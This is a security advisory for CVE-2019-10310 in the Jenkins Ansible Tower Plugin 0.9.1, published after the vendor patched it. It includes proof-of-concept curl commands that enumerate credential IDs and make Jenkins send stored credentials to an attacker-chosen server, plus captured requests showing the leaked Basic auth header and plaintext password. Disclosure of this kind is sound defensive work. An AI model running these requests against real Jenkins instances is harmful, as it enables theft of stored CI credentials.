## Jenkins Ansible Tower Plugin - Information disclosure vulnerability

##### Discovered by:
* Peter Adkins <peter.adkins@kernelpicnic.net>

##### Access:
* Local network; authenticated access
* Remote network; authenticated access (See notes)
* Remote network; 'drive-by' via CSRF

##### Tracking and identifiers:
* CVE - CVE-2019-10310

##### Versions Affected:
* Jenkins Ansible Tower Plugin 0.9.1

##### Vendor involvement:
* 2019-03-12 - Vendor Disclosure
* 2019-04-30 - Vendor Patched
* 2019-05-06 - Public Release

##### Notes:
1. This may be exploited by an anonymous user if unauthenticated access is enabled in Jenkins.

1. As this vulnerability is exploitable through HTTP GET request, this vulnerability may also be exploited via Cross Site Request Forgery (CSRF).

1. Originally published under [TALOS-2019-0786](https://talosintelligence.com/vulnerability_reports/TALOS-2019-0786). Mirrored here here for tracking purposes.

##### Overview:
An exploitable information disclosure vulnerability exists in the `testTowerConnection` function of the Jenkins Ansible Tower Plugin 0.9.1. A specially crafted HTTP request from a user with Overall/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credentials from the Jenkins credentials database to an attacker-controlled server.  This vulnerability is also present in the `fillTowerCredentialsIdItems` endpoint exposed by this plugin, which allows for the enumeration of credentials identifiers required for this attack to be successful.

In addition to the above, if the responding server does not return properly formatted JSON document, the response will be reflected to the user as part of the reported error resulting in an HTTP GET only Server Side Request Forgery (SSRF).

##### Analysis:
This vulnerability exists in the `testTowerConnection` endpoint exposed by the `doTestTowerConnection` method of `org.jenkinsci.plugins.ansible_tower.util.TowerInstallation` due to missing Jenkins permissions check. The same missing permissions check also exists in the `doFillTowerCredentialsIdItems` method, which yields the ability to enumerate credentials.

Due to the way in which this plugin expects to authenticate against the remote Ansible Tower instance, the credentials associated with the attacker specified `towerCredentialsId` are base64-encoded and submitted as part of the HTTP Authorization header to the attacker-controlled server, and are also included plaintext in a JSON document submitted to the attacker specified endpoint. An example of this attack against a Jenkins 2.165 instance running a vulnerable version of this plugin and configured to allow anonymous read access has been provided below.

```
# List credentials on target Jenkins instance.
$ curl -s -X GET -G \
    -d 'pretty=true' \
    'http://127.0.0.1:8080/jenkins/descriptorByName/org.jenkinsci.plugins.ansible_tower.util.TowerInstallation/fillTowerCredentialsIdItems'
{
"_class" : "com.cloudbees.plugins.credentials.common.StandardListBoxModel",
"values" : [
    {
    "name" : "- none -",
    "selected" : false,
    "value" : ""
    },
    {
    "name" : "BBBBBB/****** (ExampleOnly)",
    "selected" : false,
    "value" : "01e367ef-54fb-4da0-8044-5112935037bb"
    },
    {
    "name" : "SecureUsername/****** (Credentials for X)",
    "selected" : false,
    "value" : "287fcbe2-177e-4108-ac58-efdc0a507376"
    },
    {
    "name" : "A Secret Text Entry",
    "selected" : false,
    "value" : "532ba431-e25d-4aad-bc74-fb5b2cc03bd7"
    }
]
}

# Send credentials to an attacker's server (http://127.0.0.1:7000?).
# The trailing '?' is to ensure that the expected path is appended as a
# query parameter, rather than part of the query path.
#
# Two requests are performed by Jenkins here. The first is a 'ping', which
# requires that the target respond with a well formed JSON response -
# though any JSON response will do. If this first request fails, the reply
# will be reflected to the client (SSRF). If it succeeds, a subsequent
# POST will be performed which contains the credentials.
#
$ curl -s -X GET -G \
    -d 'towerURL=http://127.0.0.1:7000/report.json?' \
    -d 'towerTrustCert=false' \
    -d 'enableDebugging=true' \
    -d 'towerCredentialsId=287fcbe2-177e-4108-ac58-efdc0a507376' \
    'http://127.0.0.1:8080/jenkins/descriptorByName/org.jenkinsci.plugins.ansible_tower.util.TowerInstallation/testTowerConnection'
```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following:

```
# First request from Jenkins (GET)
/report.json?/api/v2/ping/
Host: 127.0.0.1:7000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1-alpha1 (java 1.5)

# Second request from Jenkins (POST)
/report.json?/api/v2/authtoken/
Authorization: Basic U2VjdXJlVXNlcm5hbWU6U2VjdXJlUGFzc3dvcmRPaE5v
Content-Type: application/json
Content-Length: 61
Host: 127.0.0.1:7000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1-alpha1 (java 1.5)

{"username":"SecureUsername","password":"SecurePasswordOhNo"}
```
